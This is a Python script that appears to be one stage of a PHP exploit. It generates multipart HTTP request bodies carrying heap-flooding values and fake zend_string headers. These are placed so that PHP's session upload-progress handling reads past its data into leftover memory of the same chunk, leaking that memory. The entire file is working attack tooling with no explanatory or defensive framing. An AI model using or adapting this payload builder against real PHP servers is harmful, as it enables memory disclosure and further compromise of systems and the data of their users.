#!/usr/bin/env python3
"""Build the multi-stage B body: basedir-killer floods + id-forge values.

Field spec: a comma/space separated list of items
  F:<pages>    flood value whose data fills pages 1..<pages> of its chunk ('A')
  A:<page>     id-forge value for an id at <page>; data ends 8 bytes after the
               fake zend_string header, so the read spills into residual A-era
               memory of the same chunk.
  S:<pages>    plain big value with 'S' fill

Example:
  python3 mk_leak_b.py --out /tmp/b.bin --spec "F:501,F:501,A:0x137,A:0x137"
"""
from __future__ import annotations

import argparse
import struct

BOUNDARY = b"C" * 10


def value_pages(pages: int, fill: bytes) -> bytes:
    L = pages * 4096 - 25
    return fill * L


def tag8(idx: int, tagged: bool) -> bytes:
    if tagged:
        return b"/" + ("%02d" % (idx % 100)).encode() + b"BBBBB"
    return b"BBBB/BBB"


def forge_fill_value(pages: int, page: int, fake_len: int, idx: int = 0, tagged: bool = False) -> bytes:
    # full-chunk fill with a fake zend_string header at chunk + page*0x1000
    L = pages * 4096 - 25
    v = bytearray(b"A" * L)
    hdr = page * 0x1000 - 0x1018
    if 0 <= hdr and hdr + 0x18 + 8 <= L:
        struct.pack_into("<I", v, hdr + 0x00, 0)
        struct.pack_into("<I", v, hdr + 0x04, 0x16)
        struct.pack_into("<Q", v, hdr + 0x08, 0)
        struct.pack_into("<Q", v, hdr + 0x10, fake_len)
        v[hdr + 0x18:hdr + 0x18 + 8] = tag8(idx, tagged)
    return bytes(v)


def progress_forge_value(page: int, fake_len: int) -> bytes:
    """Value for PHP_SESSION_UPLOAD_PROGRESS: its smart_str key is prefix+value,
    data at chunk+0x1018 when the buffer starts at page 1.  Put the fake
    zend_string header at the id page inside the *value* bytes."""
    D = page * 0x1000 - 0x1018      # data offset of the fake header
    voff = D - 16                   # value offset (after 'upload_progress_')
    v = bytearray(b"K" * (voff + 0x18 + 8))
    struct.pack_into("<I", v, voff + 0x00, 0)
    struct.pack_into("<I", v, voff + 0x04, 0x16)
    struct.pack_into("<Q", v, voff + 0x08, 0)
    struct.pack_into("<Q", v, voff + 0x10, fake_len)
    v[voff + 0x18:voff + 0x18 + 8] = b"/99BBBBB"
    return bytes(v)


def forge_value(page: int, fake_len: int, idx: int = 0, tagged: bool = False) -> bytes:
    # value struct will start at chunk+0x1000; data at chunk+0x1018
    hdr = page * 0x1000 - 0x1018  # data offset of the fake zend_string header
    tail = 8
    L = hdr + 0x18 + tail
    v = bytearray(b"A" * L)
    # fake zend_string at the id address
    struct.pack_into("<I", v, hdr + 0x00, 0)          # refcount 0 -> no free
    struct.pack_into("<I", v, hdr + 0x04, 0x16)       # IS_STRING|GC_NOT_COLLECTABLE
    struct.pack_into("<Q", v, hdr + 0x08, 0)          # h
    struct.pack_into("<Q", v, hdr + 0x10, fake_len)   # len
    v[hdr + 0x18:hdr + 0x18 + tail] = tag8(idx, tagged)[:tail]     # first byte 'B', '/' -> valid_key FAILURE
    return bytes(v)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", required=True)
    ap.add_argument("--spec", default="")
    ap.add_argument("--sid", default="a")
    ap.add_argument("--progress", default="k0")
    ap.add_argument("--name-len", type=int, default=120)
    ap.add_argument("--fake-len", type=lambda x: int(x, 0), default=0x2000)
    ap.add_argument("--tag", action="store_true")
    args = ap.parse_args()

    out = bytearray()

    def part(name: bytes, value: bytes) -> None:
        out.extend(b"--" + BOUNDARY +
                   b"\r\nContent-Disposition: form-data; name=\"" + name +
                   b"\"\r\n\r\n" + value + b"\r\n")

    part(b"PHPSESSID", args.sid.encode())
    has_p = any(it.partition(":")[0] == "P" for it in args.spec.replace(",", " ").split())
    if not has_p:
        part(b"PHP_SESSION_UPLOAD_PROGRESS", args.progress.encode())

    idx = 0
    for item in args.spec.replace(",", " ").split():
        kind, _, arg = item.partition(":")
        if kind in ("F", "S"):
            pages = int(arg, 0)
            v = value_pages(pages, b"A" if kind == "F" else b"S")
        elif kind == "A":
            page = int(arg, 0)
            v = forge_value(page, args.fake_len, idx, args.tag)
        elif kind == "X":
            cnt = int(arg, 0)
            for j in range(cnt):
                nm = ("x%05d" % idx).encode() + b"[a]" * 12
                part(nm, b"v")
                idx += 1
            continue
        elif kind == "P":
            page = int(arg, 0)
            part(b"PHP_SESSION_UPLOAD_PROGRESS", progress_forge_value(page, args.fake_len))
            idx += 1
            continue
        elif kind == "G":
            pages_s, _, page_s = arg.partition(":")
            v = forge_fill_value(int(pages_s, 0), int(page_s, 0), args.fake_len, idx, args.tag)
        else:
            raise SystemExit("bad spec item %r" % item)
        name = (b"f%04d" % idx).ljust(args.name_len, b"f")[:args.name_len]
        part(name, v)
        idx += 1

    out.extend(b"--" + BOUNDARY + b"--\r\n")
    with open(args.out, "wb") as fh:
        fh.write(bytes(out))
    print("body=%d fields=%d fake_len=%#x" % (len(out), idx, args.fake_len))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
